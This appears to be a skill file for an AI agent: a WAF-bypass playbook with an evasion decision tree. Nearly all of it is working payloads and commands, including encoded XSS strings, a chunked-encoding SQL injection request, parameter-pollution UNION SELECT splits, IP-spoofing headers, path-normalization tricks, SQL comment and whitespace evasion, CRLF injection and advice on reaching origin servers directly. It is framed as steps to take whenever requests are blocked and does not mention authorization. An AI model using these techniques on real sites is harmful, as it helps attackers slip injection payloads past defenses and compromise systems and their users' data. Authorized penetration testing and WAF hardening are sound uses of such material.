---
name: waf-bypass-techniques
description: >-
  WAF bypass techniques playbook. Use when requests are blocked by a Web Application Firewall and you need to evade detection using encoding, protocol tricks, payload obfuscation, or structural manipulation.
---

# SKILL: WAF Bypass Techniques

## 0. RELATED ROUTING

- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) for SQL-specific filter evasion (inline comments, CHAR, case)
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS payload obfuscation
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) for SSRF bypass through WAF

---

## 1. WAF FINGERPRINTING

```bash
wafw00f https://target.com          # identify WAF product
curl -v -H "X-Scan: test" https://target.com   # trigger WAF banner
# 403 with WAF vendor page → CloudFlare/Akamai/AWS WAF/ModSecurity/etc.

# Behavioral fingerprint:
# 1. Send normal request → baseline 200
# 2. Add <script> → if 403/406/999 → WAF present
# 3. Add ../../../etc/passwd → if 400/403 → path traversal rule
# 4. Add ' OR 1=1-- → if blocked → SQLi rule
# 5. Response latency difference → IDS vs inline WAF
```

---

## 2. ENCODING BYPASSES

| Technique | Example (payload: `<script>alert(1)</script>`) |
|-----------|------------------------------------------------|
| URL encode | `%3Cscript%3Ealert(1)%3C%2Fscript%3E` |
| Double URL encode | `%253Cscript%253E` |
| Unicode escape | `<script>` |
| HTML entity | `&lt;script&gt;` |
| Hex entity | `&#x3C;script&#x3E;` |
| Decimal entity | `&#60;script&#62;` |
| Overlong UTF-8 | `%C0%BCscript%C0%BE` (legacy parsers) |
| Mixed case | `<ScRiPt>aLeRt(1)</sCrIpT>` |
| Null byte | `<scr\x00ipt>` (some parsers strip null) |

---

## 3. CHUNKED TRANSFER ENCODING

```http
POST /vuln HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

5
param
6
=val' 
3
OR 
4
1=1-
1
-
0

```

WAFs that inspect `Content-Length` only miss chunked payloads split across chunk boundaries.

---

## 4. HTTP/2 BYPASS

```
HTTP/2 uses binary framing — some WAFs inspect HTTP/1.1 text representation only.
Downgrade-resistant technique: send payload in HTTP/2 HEADERS frame.

curl --http2 -d "param=<script>alert(1)</script>" https://target.com
# If WAF only analyzes HTTP/1.1 translation, payload may pass.
```

---

## 5. HTTP PARAMETER POLLUTION (HPP)

| Platform | Behavior for `?a=1&a=2` |
|----------|-------------------------|
| PHP      | Last value: `a=2`       |
| ASP.NET  | Concatenated: `a=1,2`   |
| Python (Flask/Django) | First: `a=1` |
| Node.js (Express) | First: `a=1` or array |

```
# Split payload across duplicate params:
?search=SE&search=LECT * FR&search=OM users
# If backend concatenates → SELECT * FROM users
# WAF sees each part as harmless

# Content-Type pollution:
GET /api/user?id=1 UNION SELECT--&id=1
```

---

## 6. IP SOURCE SPOOFING HEADERS

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
# If WAF uses these for allowlist → bypass IP restrictions
```

---

## 7. PATH NORMALIZATION

| Trick | Example |
|-------|---------|
| Double slash | `//admin//config` |
| Dot-slash | `/./admin/./config` |
| Semicolon (Tomcat/Spring) | `/admin;x=y/config` |
| Backslash (IIS) | `/admin\config` |
| URL-encoded slash | `%2Fadmin%2Fconfig` |
| Case variation (Windows) | `/ADMIN/CONFIG` |
| Null byte | `/admin%00/config` |
| Unicode normalization | `/ａdmin/` (fullwidth a) |

---

## 8. CONTENT-TYPE MANIPULATION

```http
# Mismatch: send JSON body with form content-type
Content-Type: application/x-www-form-urlencoded
body: {"query":"' OR 1=1--"}

# Or JSON with text/plain
Content-Type: text/plain
body: {"action":"<script>alert(1)</script>"}

# Multipart with extra boundary params
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary; charset=utf-7

# WAF may not parse alternate content-types; backend does.
```

---

## 9. NEWLINE / WHITESPACE INJECTION

```sql
-- SQL comment variants:
SELECT/**/1/**/FROM/**/users
SELECT%091%09FROM%09users    -- tab (0x09)
SELECT%0A1%0AFROM%0Ausers    -- newline
SELECT%0D1%0DFROM%0Dusers    -- carriage return

-- MySQL-specific:
SELECT/*!50000 1*/FROM users  -- version comment

-- Whitespace between keyword and paren:
SELECT 1 FROM users WHERE id=1 UNION  SELECT  1,2,3--
```

---

## 10. KEYWORD ALTERNATIVES

| Blocked     | Alternatives                                  |
|-------------|-----------------------------------------------|
| UNION       | `UNION ALL`, `UNION DISTINCT`                 |
| SELECT      | `(SELECT)`, in subquery context               |
| AND/OR      | `&&`, `\|\|`, `BETWEEN`, `IN`, `LIKE`       |
| =           | `LIKE`, `REGEXP`, `<>`, `BETWEEN x AND x`    |
| space       | `/**/`, `%09`, `%0a`, `%0d`, `()`            |
| SLEEP       | `BENCHMARK(N,MD5(1))`, `WAITFOR DELAY`        |
| script      | `<img onerror=`, `<svg onload=`               |
| alert       | `confirm()`, `prompt()`, `console.log()`      |
| onerror     | `onload`, `onclick`, `onmouseover`            |
| javascript: | `data:text/html,<script>alert(1)</script>`    |

---

## 11. PROTOCOL-LEVEL BYPASSES

```http
# Absolute URI request (HTTP/1.1 spec allows):
GET http://target.com/admin HTTP/1.1
Host: target.com

# CRLF injection in header value:
X-Custom: value%0d%0aX-Injected: bypass

# Keep-alive race: send normal request then malicious in same TCP connection
# before WAF re-inspects state

# Large payload: some WAFs skip inspection above size threshold
# Pad payload with junk: param=AAAA...AAAA<script>alert(1)</script>
```

---

## 12. COMMON MISTAKES

- **Size limits**: WAFs may skip inspection for large bodies → pad with junk before payload
- **Rate limiting**: slow down to avoid behavioral detection
- **CDN caching**: cached responses bypass WAF on re-request
- **Origin server direct access**: find origin IP and connect directly (bypass CDN+WAF)
- **Multipart upload**: some WAFs don't inspect multipart file contents

---

## 13. DECISION TREE

```
Request blocked by WAF
|
+-- Fingerprint WAF product (§1) → product-specific bypass lists
|
+-- Try encoding bypass (§2)
|   URL encode → double encode → Unicode → mixed case
|
+-- Try structural bypass
|   Chunked TE (§3) → HTTP/2 (§4) → HPP (§5)
|
+-- Try path normalization (§7)
|   Only for path-based rules
|
+-- Try keyword alternatives (§10)
|   Replace UNION/SELECT/AND/space with equivalents
|
+-- Try content-type mismatch (§8)
|
+-- Try IP header spoofing (§6)
|   For IP-based allowlists
|
+-- Access origin directly (§12)
    Bypass CDN/WAF entirely
```
